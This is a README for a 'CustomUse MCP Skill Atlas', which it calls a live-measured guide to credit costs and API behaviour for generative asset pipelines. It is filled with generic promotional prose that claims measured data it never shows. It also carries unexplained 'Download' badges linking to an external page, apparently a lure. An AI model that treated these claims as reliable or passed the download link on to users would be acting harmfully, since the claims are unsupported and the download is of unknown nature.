![preview](https://raw.githubusercontent.com/azharshkh/customus-credit-api/main/showcase_000f.svg)
# CustomUse MCP Skill Atlas 🧠🛠️

A field-tested, live-verified knowledge base for teams building generative asset pipelines around CustomUse. This repository is not a wrapper library, not a thin SDK fork, and definitely not a copy-paste dump of stale documentation. It is an **atlas** — a map of observed behavior, measured credit consumption, and real-world response patterns captured against the production service while building creative tooling for images, video, 3D meshes, texturing, rigging, and Roblox-ready assets.

Think of it as the cartographer's notebook for a territory that shifts under your feet. Every endpoint, every quota curve, every latency spike has been walked, measured, and annotated so that you don't have to rediscover the same cliff edges.

[![Download](https://raw.githubusercontent.com/azharshkh/customus-credit-api/main/go_05d12.svg)](https://azharshkh.github.io/customus-credit-api/)

---

## 🧭 Why This Atlas Exists

Most integrations die in the gap between "the docs say X" and "the service actually does Y." That gap is where credits vanish, where jobs hang, and where creative pipelines stall at 3 a.m. This repository closes that gap by treating the live service as the single source of truth.

We logged what we saw. We charted it. We're sharing the terrain.

The result is a practical reference for anyone orchestrating generative asset workflows — whether you're producing a single hero texture or thousands of rigged meshes destined for a virtual world.

---

## 🚀 What's Inside

A structured, living collection of observed behavior, credit economics, and integration patterns across the full asset lifecycle.

- **Image Generation** — prompt-to-image behavior, aspect ratio quirks, iteration costs, and turnaround variance
- **Video Generation** — short-clip synthesis, frame handling, and the credit slope as duration grows
- **3D Mesh Creation** — topology expectations, polycount behavior, and export readiness
- **Texturing** — material maps, seam handling, and resolution-dependent cost curves
- **Rigging** — skeleton assignment behavior, joint handling, and animation-ready outputs
- **Roblox Asset Workflows** — mesh-to-platform pipelines, format expectations, and asset packaging notes
- **Credit Cost Tables** — measured per-operation consumption, not theoretical estimates
- **API Behavior Logs** — response shapes, error surfaces, retry semantics, and rate-limit dance steps
- **Integration Patterns** — sequencing, batching, queueing, and failure recovery strategies

Each section is written to be read by a human first and a machine second. No mystery meat. No hand-waving.

---

## ✨ Feature Highlights

A tour of what makes this atlas different from a documentation mirror.

- 🎯 **Live-Measured Credit Economics** — every cost figure reflects observed consumption against the running service, not a marketing page guess
- 🧩 **Behavior-First Documentation** — we describe what the API *does*, including the awkward parts
- 🌐 **Multilingual Support Notes** — where language, locale, and regional endpoints change behavior
- 📱 **Responsive Pipeline Design** — patterns that scale from a laptop prototype to a distributed render farm
- ♻️ **Retry & Backoff Recipes** — resilient patterns for flaky network moments
- 🧪 **Reproducible Probes** — structured test scenarios you can replay to verify current behavior
- 🕒 **24/7 Customer Support Mindset** — every pattern is written to be debugged at any hour, by any teammate
- 🗺️ **Cross-Asset Continuity** — how an image becomes a texture becomes a mesh becomes a rigged asset
- 🔍 **SEO-Friendly Terminology** — consistent vocabulary so your searches land on the right section
- 📚 **Evergreen Structure** — sections designed to age gracefully as the underlying service evolves

---

## 🧠 The Philosophy Behind the Atlas

Documentation tells you the recipe. An atlas tells you where the ingredients actually live, what they cost at the market that morning, and which roads flood when it rains.

We approached this repository with three principles:

1. **Observe, don't assume.** If the service returned a surprising response, we wrote it down — surprise included.
2. **Measure, don't estimate.** Credit costs were tallied from real operations. Where variance existed, we recorded the range.
3. **Explain, don't just list.** Every table has a story; every anomaly has context.

This is the difference between a phone book and a travel diary. Both are useful. Only one helps you avoid the wrong neighborhood.

---

## 🗂️ Repository Structure

A guided walk through the terrain.

- **/atlas** — the core knowledge base, organized by asset type
- **/atlas/images** — image generation behavior, costs, and quirks
- **/atlas/video** — video synthesis notes and timing curves
- **/atlas/meshes** — 3D mesh generation, topology notes, export formats
- **/atlas/textures** — material and map generation behavior
- **/atlas/rigging** — skeleton and joint handling observations
- **/atlas/roblox** — platform-specific packaging and pipeline notes
- **/economics** — credit cost tables and consumption models
- **/behavior** — API response shapes, error codes, and retry semantics
- **/patterns** — integration recipes and orchestration strategies
- **/probes** — reproducible verification scenarios
- **/glossary** — shared vocabulary and SEO-friendly term mapping

Each directory contains its own orientation note so you're never dropped into a cold room.

---

## 🧪 Observed API Behavior

A sample of the kind of detail you'll find throughout this atlas. Every entry was recorded against the live service.

- **Response Envelopes** — most operations return a job handle first, with asset URLs arriving asynchronously; polling cadence matters for cost
- **Credit Deduction Timing** — credits are typically consumed at job acceptance, not at completion; failed jobs may or may not refund depending on failure class
- **Rate Limiting** — bursts are tolerated briefly, then throttled with a cooldown; sustained throughput requires pacing
- **Error Surface** — validation errors arrive fast; processing errors arrive slow and often carry partial context
- **Idempotency** — repeat submissions are not always deduplicated; design your queue accordingly
- **Asset Expiry** — generated asset URLs may have a limited validity window; mirror promptly

These notes are the difference between a pipeline that hums and one that hiccups at scale.

---

## 💳 Credit Economics at a Glance

Credits are the currency of this territory. Here's how the terrain is shaped.

- **Images** — modest cost, high volume tolerance; iteration is cheap, refinement is where the budget goes
- **Video** — cost scales steeply with duration and resolution; storyboard before you spend
- **Meshes** — cost correlates with complexity and target polycount; simple shapes are economical
- **Texturing** — resolution is the dominant cost lever; material count multiplies the effect
- **Rigging** — priced by joint complexity and animation readiness; simple rigs stay light
- **Roblox Packaging** — low per-asset cost, but volume adds up quickly across large libraries

The full tables live in the **/economics** directory, with observed ranges and variance notes.

---

## 🌍 Multilingual & Regional Considerations

Generative services behave differently across regions and languages. This atlas documents:

- Prompt language effects on output consistency
- Locale-specific endpoint routing observations
- Time-of-day performance variance tied to regional load
- Currency and billing region notes where observable
- Language-specific glossary mappings for SEO-friendly searching

If your team spans time zones, these notes will save you a few surprises.

---

## 🛡️ Reliability Patterns

Resilience is not a feature you add later. It's a posture.

- **Queue with Intent** — submit jobs through a durable queue, not a for-loop
- **Poll with Patience** — respect cadence; hammering costs credits and goodwill
- **Mirror Assets Early** — treat generated URLs as ephemeral
- **Log Everything** — correlation IDs turn mystery failures into stories
- **Fail Soft** — degraded output beats a dead pipeline
- **Budget Guards** — cap per-run credit spend to avoid runaway loops

Each pattern includes rationale, trade-offs, and observed outcomes.

---

## 👥 Who This Is For

- Pipeline engineers building generative asset workflows
- Technical artists bridging AI output and production tools
- Studio teams producing Roblox-ready content at scale
- Researchers measuring real service behavior
- Anyone tired of guessing what a credit actually buys

If you've ever watched a job hang and wondered *why*, this atlas was written for you.

---

## 🤝 Contributing

Contributions are welcome, provided they follow the atlas spirit: observe, measure, explain.

- Add new probe scenarios under **/probes**
- Update cost tables with fresh measurements and timestamps
- Document new API behaviors with reproducible steps
- Improve clarity without losing precision
- Keep the tone human, the data honest

Open an issue to discuss scope before large additions. Small, well-documented contributions are the lifeblood of this repository.

---

## ⚠️ Disclaimer

This repository is an independent, community-maintained knowledge base. It is **not affiliated with, endorsed by, or officially connected to** CustomUse or any related service provider.

All observations, cost figures, and behavior notes reflect the state of the live service **at the time of measurement** and may change without notice. Credit costs, response shapes, rate limits, and asset handling behavior are subject to the provider's terms and updates.

Nothing in this repository constitutes legal, financial, or professional advice. Verify all behavior against the current production service before relying on it in critical pipelines. Use of any third-party service is governed by that service's own terms.

The year **2026** is used throughout as the reference period for measurements and examples.

---

## 📜 License

This project is released under the **MIT License**.

You are welcome to use, modify, and distribute this work in accordance with the license terms. See the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — CustomUse MCP Skill Atlas contributors.

---

## 🧾 Final Word

An atlas is never finished. Coastlines shift, rivers change course, and new territories appear. This repository is built to grow with the terrain — measured honestly, documented clearly, and shared generously.

If it saves you a single wasted credit or a single sleepless night, it has done its job.

Happy mapping. 🗺️

[![Download](https://raw.githubusercontent.com/azharshkh/customus-credit-api/main/go_05d12.svg)](https://azharshkh.github.io/customus-credit-api/)